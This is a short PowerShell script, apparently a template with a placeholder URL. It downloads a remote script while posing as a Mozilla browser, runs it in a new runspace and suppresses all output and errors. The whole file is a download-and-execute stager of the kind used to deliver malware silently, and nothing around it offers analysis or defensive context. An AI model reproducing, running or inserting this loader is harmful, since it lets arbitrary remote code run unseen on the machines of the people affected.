$url = '__URL__'

try {
    $wc = New-Object Net.WebClient
    $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
    $script = $wc.DownloadString($url)

    $rs = [RunspaceFactory]::CreateRunspace()
    $rs.ApartmentState = 'STA'
    $rs.ThreadOptions  = 'ReuseThread'
    $rs.Open()

    $ps = [PowerShell]::Create()
    $ps.Runspace = $rs
    [void]$ps.AddScript($script)
    $ps.Invoke() | Out-Null
    $ps.Dispose(); $rs.Dispose()
} catch { }
